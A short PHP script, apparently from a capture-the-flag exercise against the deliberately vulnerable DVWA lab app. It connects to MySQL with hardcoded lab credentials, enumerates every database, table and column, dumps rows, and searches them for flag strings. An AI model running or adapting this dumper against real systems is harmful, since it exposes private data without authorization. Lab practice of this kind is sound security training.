<?php
// DVWA DB recon: connect, list databases/tables, dump all rows, search flag{
$hosts = array('dvwa-db', '127.0.0.1', 'localhost');
$user = 'dvwa';
$pass = 'p@ssw0rd';
foreach ($hosts as $h) {
    $m = @new mysqli($h, $user, $pass, null, 3306);
    if ($m->connect_error) { echo "[$h] FAIL: {$m->connect_error}\n"; continue; }
    echo "[$h] CONNECTED\n";
    $dbs = $m->query("SHOW DATABASES");
    while ($d = $dbs->fetch_row()) { echo "  DB: {$d[0]}\n"; }
    $dbs->data_seek(0);
    while ($d = $dbs->fetch_row()) {
        $db = $d[0];
        if (in_array($db, array('information_schema','performance_schema','mysql','sys'))) continue;
        $m->select_db($db);
        $t = $m->query("SHOW TABLES");
        while ($r = $t->fetch_row()) {
            $tbl = $r[0];
            echo "    TABLE: $db.$tbl\n";
            $cols = $m->query("SHOW COLUMNS FROM `$tbl`");
            $cnames = array();
            while ($c = $cols->fetch_row()) { $cnames[] = $c[0]; }
            echo "      COLS: " . implode(',', $cnames) . "\n";
            $rows = $m->query("SELECT * FROM `$tbl` LIMIT 50");
            if ($rows) {
                while ($rw = $rows->fetch_assoc()) {
                    $line = json_encode($rw);
                    if (preg_match('/flag\{/i', $line)) { echo "      FLAGROW: $line\n"; }
                    else { echo "      ROW: " . substr($line, 0, 300) . "\n"; }
                }
            }
        }
    }
    $m->close();
    break; // only first successful host
}
?>
